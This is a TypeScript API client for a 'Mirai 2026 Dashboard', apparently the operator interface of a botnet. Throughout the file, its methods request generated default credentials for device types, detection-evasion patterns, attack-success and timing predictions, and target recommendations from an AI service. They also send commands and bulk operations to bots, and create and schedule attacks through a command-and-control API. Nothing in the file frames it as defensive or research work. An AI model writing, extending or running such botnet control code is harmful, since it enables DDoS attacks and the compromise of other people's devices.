/**
 * API Client for Mirai 2026 Dashboard
 * Connects to backend services (AI, C&C, Prometheus)
 */

const API_BASE_URL = process.env.NEXT_PUBLIC_AI_SERVICE_URL || 'http://localhost:8001';
const CNC_API_URL = process.env.NEXT_PUBLIC_CNC_API_URL || 'http://localhost:8080';

export interface ApiResponse<T> {
  success: boolean;
  data?: T;
  error?: string;
  message?: string;
}

class ApiClient {
  private baseUrl: string;
  private cncUrl: string;

  constructor() {
    this.baseUrl = API_BASE_URL;
    this.cncUrl = CNC_API_URL;
  }

  private async request<T>(
    url: string,
    options: RequestInit = {}
  ): Promise<ApiResponse<T>> {
    try {
      const response = await fetch(url, {
        ...options,
        headers: {
          'Content-Type': 'application/json',
          ...options.headers,
        },
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const data = await response.json();
      return { success: true, data };
    } catch (error) {
      console.error('API request failed:', error);
      return {
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
      };
    }
  }

  // AI Service Endpoints
  async getCredentials(deviceType: string, count: number = 10) {
    return this.request(`${this.baseUrl}/generate-credentials`, {
      method: 'POST',
      body: JSON.stringify({ device_type: deviceType, count }),
    });
  }

  async getEvasionPattern(detectionType: string) {
    return this.request(`${this.baseUrl}/evasion-pattern`, {
      method: 'POST',
      body: JSON.stringify({ detection_type: detectionType }),
    });
  }

  async predictBotChurn() {
    return this.request(`${this.baseUrl}/predict/bot-churn`, {
      method: 'GET',
    });
  }

  async predictAttackSuccess(attackConfig: any) {
    return this.request(`${this.baseUrl}/predict/attack-success`, {
      method: 'POST',
      body: JSON.stringify(attackConfig),
    });
  }

  async getOptimalTiming(attackType: string) {
    return this.request(`${this.baseUrl}/predict/optimal-timing`, {
      method: 'POST',
      body: JSON.stringify({ attack_type: attackType }),
    });
  }

  async getTargetRecommendations(count: number = 5) {
    return this.request(`${this.baseUrl}/recommend/targets`, {
      method: 'POST',
      body: JSON.stringify({ count }),
    });
  }

  // C&C API Endpoints
  async getBots() {
    return this.request(`${this.cncUrl}/api/bots`, {
      method: 'GET',
    });
  }

  async getBot(botId: string) {
    return this.request(`${this.cncUrl}/api/bots/${botId}`, {
      method: 'GET',
    });
  }

  async executeBulkOperation(operation: {
    type: string;
    botIds: string[];
    config?: any;
  }) {
    return this.request(`${this.cncUrl}/api/bots/bulk`, {
      method: 'POST',
      body: JSON.stringify(operation),
    });
  }

  async executeCommand(botId: string, command: string) {
    return this.request(`${this.cncUrl}/api/bots/${botId}/command`, {
      method: 'POST',
      body: JSON.stringify({ command }),
    });
  }

  async getAttacks() {
    return this.request(`${this.cncUrl}/api/attacks`, {
      method: 'GET',
    });
  }

  async createAttack(attackConfig: any) {
    return this.request(`${this.cncUrl}/api/attacks`, {
      method: 'POST',
      body: JSON.stringify(attackConfig),
    });
  }

  async scheduleAttack(schedule: any) {
    return this.request(`${this.cncUrl}/api/attacks/schedule`, {
      method: 'POST',
      body: JSON.stringify(schedule),
    });
  }

  async getAttackHistory() {
    return this.request(`${this.cncUrl}/api/attacks/history`, {
      method: 'GET',
    });
  }

  // Bot Groups
  async getGroups() {
    return this.request(`${this.cncUrl}/api/groups`, {
      method: 'GET',
    });
  }

  async createGroup(name: string, tags: string[] = []) {
    return this.request(`${this.cncUrl}/api/groups`, {
      method: 'POST',
      body: JSON.stringify({ name, tags }),
    });
  }

  async addBotToGroup(botId: string, groupId: string) {
    return this.request(`${this.cncUrl}/api/groups/${groupId}/bots`, {
      method: 'POST',
      body: JSON.stringify({ botId }),
    });
  }

  async removeBotFromGroup(botId: string, groupId: string) {
    return this.request(`${this.cncUrl}/api/groups/${groupId}/bots/${botId}`, {
      method: 'DELETE',
    });
  }

  // Webhooks
  async getWebhooks() {
    return this.request(`${this.cncUrl}/api/webhooks`, {
      method: 'GET',
    });
  }

  async createWebhook(webhook: any) {
    return this.request(`${this.cncUrl}/api/webhooks`, {
      method: 'POST',
      body: JSON.stringify(webhook),
    });
  }

  async testWebhook(webhookId: string) {
    return this.request(`${this.cncUrl}/api/webhooks/${webhookId}/test`, {
      method: 'POST',
    });
  }

  async deleteWebhook(webhookId: string) {
    return this.request(`${this.cncUrl}/api/webhooks/${webhookId}`, {
      method: 'DELETE',
    });
  }

  // Health check
  async healthCheck() {
    const [aiHealth, cncHealth] = await Promise.all([
      this.request(`${this.baseUrl}/health`),
      this.request(`${this.cncUrl}/api/health`),
    ]);

    return {
      ai: aiHealth.success,
      cnc: cncHealth.success,
    };
  }
}

export const apiClient = new ApiClient();
export default apiClient;
